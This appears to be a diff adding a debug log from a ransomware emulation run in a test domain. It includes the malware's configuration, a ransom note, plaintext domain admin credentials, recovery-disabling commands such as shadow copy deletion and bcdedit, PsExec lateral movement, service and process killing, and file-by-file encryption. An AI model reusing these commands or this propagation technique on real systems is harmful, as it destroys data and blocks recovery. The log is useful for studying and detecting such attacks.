@@ -1,0 +1,367 @@
+[INFO]  [2023-10-18 16:31:52] Loaded configuration information.
+[INFO]  [2023-10-18 16:31:52] Current configuration:  
+    kill_processes: ["msedge", "encsvc", "mydesktopqos", "xfssvccon", "firefox", "infopath", "winword", "steam", "synctime", "notepad", "ocomm", "onenote", "mspub", "thunderbird", "agntsvc", "sql", "excel", "powerpnt", "outlook", "wordpad", "isqlplussvc", "sqbcoreservice", "oracle", "ocautoupds", "dbsnmp", "msaccess", "tbirdconfig", "ocssd", "mydesktopservice", "visio", "mepocs", "memtas", "veeam", "backup", "sql", "vss", "msexchange"]
+    kill_services: ["BDESVC", "MSSQLSERVER", "SDRSVC", "VSS", "wuauserv"]
+    kill_processes_linux: ["libvirtd", "virsh", "libvirt-dbus"]
+    kill_services_linux: ["libvirtd"]
+    exclude_directory_names: ["system volume information", "intel", "$windows.~ws", "application data", "$recycle.bin", "mozilla", "program files (x86)", "program files", "$windows.~bt", "public", "msocache", "windows", "default", "all users", "tor browser", "programdata", "boot", "config.msi", "google", "perflogs", "appdata", "windows.old", "WindowsAzure"]
+    exclude_file_names: ["desktop.ini", "autorun.inf", "ntldr", "bootsect.bak", "thumbs.db", "boot.ini", "ntuser.dat", "iconcache.db", "bootfont.bin", "ntuser.ini", "ntuser.dat.log"]
+    exclude_file_extensions: ["themepack", "nls", "diagpkg", "msi", "lnk", "exe", "cab", "scr", "bat", "drv", "rtp", "msp", "prf", "msc", "ico", "key", "ocx", "diagcab", "diagcfg", "pdb", "wpx", "hlp", "icns", "rom", "dll", "msstyles", "mod", "ps1", "ics", "hta", "bin", "cmd", "ani", "386", "lock", "cur", "idx", "sys", "com", "deskthemepack", "shs", "ldf", "theme", "mpa", "nomedia", "spl", "cpl", "adv", "icl", "msu", "xtlog"]
+    strict_include_paths: []
+    enable_set_wallpaper: true
+    enable_network_discovery: true
+    enable_self_propagation: true
+    enable_vm_kill: true
+    enable_vm_snapshot_kill: true
+    enable_enc: true
+    enable_recovery_hampering: true
+    enable_event_del: true
+    enable_hidden_partitions: true
+    unmount_hidden_partitions: true
+    extension: .skyfl2e
+    note_file_name: RECOVER-SKYFL2E-FILES.txt
+    note_full_text: >>Introduction
+Important files on your machine were ENCRYPTED and now they have the "SKYFL2E" extension.
+In order to recover your files, you need to follow the instructions below.
+
+>>CAUTION
+DO NOT MODIFY ENCRYPTED FILES YOURSELF.
+DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
+YOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.
+YOUR DATA IS STRONGLY ENCRYPTED, YOU CANNOT DECRYPT IT WITHOUT CIPHER KEY.
+
+>>What Should I do Next?
+Follow these simple steps to get everything back to normal:
+1) Download and install Tor browser from https://www.torproject.org/download/
+2) Navigate to: askfjejtqekjge0et1lkjasdq09gji13jgkdajv.testonion/?access-key=2646AEF615CD1126
+
+    empty_recycle_bin: true
+    psexec_username: digirunaway\evals_domain_admin
+    psexec_password: axi9eengei9inaeR@
+    strict_include_targets: ["10.10.20.22"]
+
+[INFO]  [2023-10-18 16:31:52] Running ELEVATED
+[INFO]  [2023-10-18 16:31:52] Created encryption thread pool of size 12
+[INFO]  [2023-10-18 16:31:52] Deleting shadow copies.
+[DEBUG] [2023-10-18 16:31:52] Initializing COM
+[DEBUG] [2023-10-18 16:31:52] Initialized COM
+[DEBUG] [2023-10-18 16:31:52] Initializing COM security
+[DEBUG] [2023-10-18 16:31:52] Initialized COM security
+[DEBUG] [2023-10-18 16:31:52] Creating backup components
+[DEBUG] [2023-10-18 16:31:52] Created backup components
+[DEBUG] [2023-10-18 16:31:52] Initializing for backup
+[DEBUG] [2023-10-18 16:31:52] Initialized for backup
+[DEBUG] [2023-10-18 16:31:52] Setting context
+[DEBUG] [2023-10-18 16:31:52] Context set
+[DEBUG] [2023-10-18 16:31:52] Setting backup state
+[DEBUG] [2023-10-18 16:31:52] Backup state set
+[DEBUG] [2023-10-18 16:31:52] Querying for snapshots
+[DEBUG] [2023-10-18 16:31:52] Snapshots queried
+[DEBUG] [2023-10-18 16:31:52] Fetching shadows
+[DEBUG] [2023-10-18 16:31:52] Snapshot queried
+[INFO]  [2023-10-18 16:31:52] Snapshot: 19780337092698417731
+[INFO]  [2023-10-18 16:31:52] Deleting snapshot
+[INFO]  [2023-10-18 16:31:52] Deleted snapshot
+[DEBUG] [2023-10-18 16:31:52] Finished processing Shadow Copies.
+[INFO]  [2023-10-18 16:31:52] Successfully deleted shadow copies.
+[INFO]  [2023-10-18 16:31:52] Disabling bootloader recovery.
+[DEBUG] [2023-10-18 16:31:52] Executing: bcdedit /set {default} recoveryenabled no
+[DEBUG] [2023-10-18 16:31:52] bcdedit exited with exit code: 0
+[DEBUG] [2023-10-18 16:31:52] bcdedit stdout: The operation completed successfully.
+
+[DEBUG] [2023-10-18 16:31:52] bcdedit stderr: 
+[INFO]  [2023-10-18 16:31:52] Successfully disabled bootloader recovery
+[INFO]  [2023-10-18 16:31:52] Determining system UUID.
+[DEBUG] [2023-10-18 16:31:52] Executing: wmic csproduct get UUID
+[DEBUG] [2023-10-18 16:31:53] wmic exited with exit code: 0
+[INFO]  [2023-10-18 16:31:53] CSProduct UUID is 0CACA482-2C2E-4882-8D48-446DF108319A
+[INFO]  [2023-10-18 16:31:53] System ID: 0CACA482-2C2E-4882-8D48-446DF108319A
+[INFO]  [2023-10-18 16:31:53] Currently running as user: DIGIRUNAWAY.NET\evals_domain_admin
+[INFO]  [2023-10-18 16:31:53] Currently running on host: kimeramon
+[INFO]  [2023-10-18 16:31:53] Enabling remote-to-local and remote-to-remote symbolic link evaluation.
+[DEBUG] [2023-10-18 16:31:53] Executing: fsutil behavior set SymlinkEvaluation R2L:1
+[DEBUG] [2023-10-18 16:31:53] fsutil exited with exit code: 0
+[DEBUG] [2023-10-18 16:31:53] fsutil remote-to-local stdout: Remote-to-local symbolic link evaluation is: ENABLED
+
+[DEBUG] [2023-10-18 16:31:53] fsutil remote-to-local stderr: 
+[DEBUG] [2023-10-18 16:31:53] Executing: fsutil behavior set SymlinkEvaluation R2R:1
+[DEBUG] [2023-10-18 16:31:53] fsutil exited with exit code: 0
+[DEBUG] [2023-10-18 16:31:53] fsutil remote-to-remote stdout: Remote-to-remote symbolic link evaluation is: ENABLED
+
+[DEBUG] [2023-10-18 16:31:53] fsutil remote-to-remote stderr: 
+[INFO]  [2023-10-18 16:31:53] Successfully enabled remote-to-local and remote-to-remote symbolic link evaluation
+[INFO]  [2023-10-18 16:31:53] Emptying recycle bin
+[INFO]  [2023-10-18 16:31:53] Found 0 items in recycling bin.
+[INFO]  [2023-10-18 16:31:53] No items found in recycling bin. Skipping.
+[INFO]  [2023-10-18 16:31:53] Setting MaxMpxCt value in registry.
+[DEBUG] [2023-10-18 16:31:53] Opened existing key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
+[INFO]  [2023-10-18 16:31:53] MaxMpxCt update successful
+[INFO]  [2023-10-18 16:31:53] Performing NetBIOS network discovery to find remote hosts.
+[INFO]  [2023-10-18 16:31:53] Looking up target machine's local IPs and CIDR masks.
+[DEBUG] [2023-10-18 16:31:53] Resizing buffer for GetAdaptersInfo to 2112
+[DEBUG] [2023-10-18 16:31:53] Walking through adapter info linked list
+[DEBUG] [2023-10-18 16:31:53] Found adapter name {F698ABC1-B83F-4B1B-AD0E-F9ED9C7B82A1}
+[DEBUG] [2023-10-18 16:31:53] Found IP address and CIDR 10.10.20.11/24 for adapter {F698ABC1-B83F-4B1B-AD0E-F9ED9C7B82A1}
+[DEBUG] [2023-10-18 16:31:53] Found adapter name {270DB5E4-2D1E-4A11-9347-626537E70D6A}
+[DEBUG] [2023-10-18 16:31:53] Found IP address and CIDR 10.10.20.12/24 for adapter {270DB5E4-2D1E-4A11-9347-626537E70D6A}
+[DEBUG] [2023-10-18 16:31:53] Found adapter name {1699607A-2277-4512-8A84-AC24CE89A04E}
+[DEBUG] [2023-10-18 16:31:53] Found IP address and CIDR 10.10.20.13/24 for adapter {1699607A-2277-4512-8A84-AC24CE89A04E}
+[INFO]  [2023-10-18 16:31:53] Target machine's local IPs and CIDR masks discovered: [(10.10.20.11, 24), (10.10.20.12, 24), (10.10.20.13, 24)]
+[INFO]  [2023-10-18 16:31:53] Scanning from 10.10.20.227 to 10.10.20.176 (251 total, ignoring own IP addresses)
+[DEBUG] [2023-10-18 16:31:55] Timed out when connecting to 10.10.20.171
+[DEBUG] [2023-10-18 16:31:55] Timed out when connecting to 10.10.20.136
+[DEBUG] [2023-10-18 16:31:55] Timed out when connecting to 10.10.20.227
+...
+[DEBUG] [2023-10-18 16:32:01] Received response from 10.10.20.22
+...
+[INFO]  [2023-10-18 16:32:11] Discovered the following hosts:
+[INFO]  [2023-10-18 16:32:11] 10.10.20.22     DIGIRUNAWAY\GHOSTMON            60:45:BD:D3:6E:90
+[INFO]  [2023-10-18 16:32:11] Filtering out any IPs not in the strict_include_targets setting value: ["10.10.20.22"]
+[INFO]  [2023-10-18 16:32:11] Found local targets: [10.10.20.22]
+[INFO]  [2023-10-18 16:32:11] Performing PsExec propagation.
+[INFO]  [2023-10-18 16:32:11] setup_psexec executed successfully
+[INFO]  [2023-10-18 16:32:11] PsExec Target IP: "10.10.20.22"
+[DEBUG] [2023-10-18 16:32:11] Executing: C:\Users\EVALS_~1\AppData\Local\Temp\pmanager.exe -accepteula \\10.10.20.22 -u digirunaway\evals_domain_admin -p axi9eengei9inaeR@ -s -d -f -c C:\Users\evals_domain_admin\filemanager.exe --access-token 15742aa362a84ba3 --no-prop
+[DEBUG] [2023-10-18 16:32:53] C:\Users\EVALS_~1\AppData\Local\Temp\pmanager.exe exited with exit code: 13496
+[INFO]  [2023-10-18 16:32:53] stdout: 
+PsExec v2.43 - Execute processes remotely
+Copyright (C) 2001-2023 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+[INFO]  [2023-10-18 16:32:53] stderr: Connecting to 10.10.20.22...
+Starting PSEXESVC service on 10.10.20.22...
+Copying authentication key to 10.10.20.22...
+Connecting with PsExec service on 10.10.20.22...
+Copying C:\Users\evals_domain_admin\filemanager.exe to 10.10.20.22...
+Starting C:\Users\evals_domain_admin\filemanager.exe on 10.10.20.22...
+
+filemanager.exe started on 10.10.20.22 with process ID 13496.
+
+[INFO]  [2023-10-18 16:32:53] run_psexec executed successfully for target 10.10.20.22
+[INFO]  [2023-10-18 16:32:53] Removed the dropped PsExec executable.
+[INFO]  [2023-10-18 16:32:53] Propagation complete
+[INFO]  [2023-10-18 16:32:53] Searching for and mounting hidden partitions.
+[DEBUG] [2023-10-18 16:32:53] Processing volume \\?\Volume{36015bbf-ba75-4894-bd71-3fd568b9df40}\
+[INFO]  [2023-10-18 16:32:53] No volume paths found. Mounting this volume.
+[DEBUG] [2023-10-18 16:32:53] Using C:\zQ4ADk0l4F\ as the mount point.
+[DEBUG] [2023-10-18 16:32:53] Finished processing volume \\?\Volume{36015bbf-ba75-4894-bd71-3fd568b9df40}\
+[INFO]  [2023-10-18 16:32:53] Mounted \\?\Volume{36015bbf-ba75-4894-bd71-3fd568b9df40}\ to C:\zQ4ADk0l4F\
+[DEBUG] [2023-10-18 16:32:53] Processing volume \\?\Volume{4f4c42f3-eca1-472e-a383-3754480046e7}\
+[DEBUG] [2023-10-18 16:32:53] Found volume path name: C:\. Skipping mounting.
+[DEBUG] [2023-10-18 16:32:53] Finished processing volume \\?\Volume{4f4c42f3-eca1-472e-a383-3754480046e7}\
+[DEBUG] [2023-10-18 16:32:53] Processing volume \\?\Volume{c894390b-b542-496c-873d-018077f4bcd9}\
+[INFO]  [2023-10-18 16:32:53] No volume paths found. Mounting this volume.
+[DEBUG] [2023-10-18 16:32:53] Using C:\XPPyCbGtAh\ as the mount point.
+[DEBUG] [2023-10-18 16:32:53] Finished processing volume \\?\Volume{c894390b-b542-496c-873d-018077f4bcd9}\
+[INFO]  [2023-10-18 16:32:53] Mounted \\?\Volume{c894390b-b542-496c-873d-018077f4bcd9}\ to C:\XPPyCbGtAh\
+[DEBUG] [2023-10-18 16:32:53] Processing volume \\?\Volume{318166d1-6468-11ee-97a7-806e6f6e6963}\
+[DEBUG] [2023-10-18 16:32:53] Found volume path name: D:\. Skipping mounting.
+[DEBUG] [2023-10-18 16:32:53] Finished processing volume \\?\Volume{318166d1-6468-11ee-97a7-806e6f6e6963}\
+[DEBUG] [2023-10-18 16:32:53] Finished iterating through volumes.
+[DEBUG] [2023-10-18 16:32:53] Closed find volume handle.
+[INFO]  [2023-10-18 16:32:53] Finished mounting hidden partitions
+[INFO]  [2023-10-18 16:32:53] Generating AES key.
+[INFO]  [2023-10-18 16:32:53] AES key set to: 15fc6e57c4f0eeef5cfe8d2032df8f4d
+[INFO]  [2023-10-18 16:32:53] Terminating processes and services that may interfere with encryption.
+[INFO]  [2023-10-18 16:32:53] Trying to kill services ["BDESVC", "MSSQLSERVER", "SDRSVC", "VSS", "wuauserv"]
+[DEBUG] [2023-10-18 16:32:53] Connected to local Service Control Manager.
+[DEBUG] [2023-10-18 16:32:53] Checking status for service BDESVC
+[INFO]  [2023-10-18 16:32:53] BDESVC service is already stopped. Skipping.
+[INFO]  [2023-10-18 16:32:53] MSSQLSERVER service does not exist. Skipping
+[DEBUG] [2023-10-18 16:32:53] Checking status for service SDRSVC
+[INFO]  [2023-10-18 16:32:53] SDRSVC service is already stopped. Skipping.
+[DEBUG] [2023-10-18 16:32:53] Checking status for service VSS
+[DEBUG] [2023-10-18 16:32:53] Enumerating dependent services for service VSS
+[DEBUG] [2023-10-18 16:32:53] VSS has no dependent services to stop.
+[DEBUG] [2023-10-18 16:32:53] Sending stop code to service VSS
+[DEBUG] [2023-10-18 16:32:53] Sent stop code. Waiting for stop.
+[DEBUG] [2023-10-18 16:32:54] Service stopped successfully.
+[DEBUG] [2023-10-18 16:32:54] Checking status for service wuauserv
+[DEBUG] [2023-10-18 16:32:54] Enumerating dependent services for service wuauserv
+[DEBUG] [2023-10-18 16:32:54] wuauserv has no dependent services to stop.
+[DEBUG] [2023-10-18 16:32:54] Sending stop code to service wuauserv
+[DEBUG] [2023-10-18 16:32:54] Sent stop code. Waiting for stop.
+[DEBUG] [2023-10-18 16:33:04] Service stopped successfully.
+[INFO]  [2023-10-18 16:33:04] Finished terminating services.
+[INFO]  [2023-10-18 16:33:04] Attempting to kill processes ["msedge", "encsvc", "mydesktopqos", "xfssvccon", "firefox", "infopath", "winword", "steam", "synctime", "notepad", "ocomm", "onenote", "mspub", "thunderbird", "agntsvc", "sql", "excel", "powerpnt", "outlook", "wordpad", "isqlplussvc", "sqbcoreservice", "oracle", "ocautoupds", "dbsnmp", "msaccess", "tbirdconfig", "ocssd", "mydesktopservice", "visio", "mepocs", "memtas", "veeam", "backup", "sql", "vss", "msexchange"]
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 17568
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 12408
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 10372
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 18284
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 7156
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 7568
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 14608
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process Notepad.exe with PID 18624
+[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 9152
+[INFO]  [2023-10-18 16:33:04] Finished iterating through processes.
+[INFO]  [2023-10-18 16:33:04] Beginning enumeration and encryption.
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\DumpStack.log.tmp : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\ntuser.dat.LOG1 : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\ntuser.dat.LOG2 : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\kmimi\ntuser.dat.LOG1 : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\mtaichi\ntuser.dat.LOG1 : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\mtaichi\ntuser.dat.LOG2 : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Recovery\ReAgentOld.xml
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\ntuser.dat.LOG1 : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\ntuser.dat.LOG2 : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\CollectGuestLogsTemp\VMAgentLogs.zip
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\CollectGuestLogsTemp\VMAgentLogs.zip.json
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\CollectGuestLogsTemp\RECOVER-SKYFL2E-FILES.txt
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\evals_domain_admin\Favorites\Bing.url
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Config\c9491062-b23a-4c39-a305-f1ebf32d4b60.c9491062-b23a-4c39-a305-f1ebf32d4b60._msr2-proto1-evals-a-bastion.1.xml
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\ntuser.dat.LOG2
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\evals_domain_admin\.ssh\known_hosts.old
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\MonitoringAgent.2023.10.06-16.53.43.log
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\mtaichi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\evals_domain_admin\.ssh\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\MonitoringAgent.2023.10.06-17.24.54.log
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\ntuser.dat.LOG1
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\windesk\ntuser.dat.LOG2 : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\.ssh\known_hosts.old
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Recovery\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\AppAgentRuntime.ini
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\kmimi\.ssh\RECOVER-SKYFL2E-FILES.txt
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\evals_domain_admin\Favorites\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\AppAgentRuntime.mcf
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\Config\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\mtaichi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\mtaichi\Favorites\Bing.url
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\mtaichi\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\mtaichi\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\AzureEvents.man
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\mtaichi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\mtaichi\Favorites\RECOVER-SKYFL2E-FILES.txt
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\kmimi\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\mtaichi\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\CollectVMHealth.exe.config
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\kmimi\RECOVER-SKYFL2E-FILES.txt
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\kmimi\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\MonitoringAgent.log : "Could not add extension to encrypted file: The process cannot access the file because it is being used by another process. (os error 32)"
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\RuntimeEvents_000002.etl : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\CommonAgentConfig.config
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\IISConfigurator-Ipv4only.exe.config
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\IISConfigurator-Ipv6andIpv4.exe.config
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\IpAddressAssignment.exe.config
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\PackageInformation.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\ProviderGuids.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\TransparentInstaller.dll.config
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\WaAppAgent.exe.config
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\WindowsAzureGuestAgent.exe.config
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\zip.baseline
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Recovery\WindowsRE\boot.sdi
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\Documents\Default.rdp : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\Favorites\Bing.url
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\zorimoto\Favorites\Bing.url
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\zorimoto\Desktop\bitsadmin_test.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\zorimoto\Desktop\rclone_test.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\Favorites\Bing.url
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\zorimoto\Desktop\scp_test.txt
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\zorimoto\Desktop\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163036177.json
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163051224.json
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\windesk\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\windesk\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\kmimi\Favorites\RECOVER-SKYFL2E-FILES.txt
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\Searches\winrt--{S-1-5-21-3944120121-2183016445-1198627938-500}-.searchconnector-ms
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\windesk\Searches\RECOVER-SKYFL2E-FILES.txt
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\windesk\Favorites\RECOVER-SKYFL2E-FILES.txt
+[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\zorimoto\Favorites\RECOVER-SKYFL2E-FILES.txt
+[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Recovery\WindowsRE\ReAgent.xml : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
+[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms
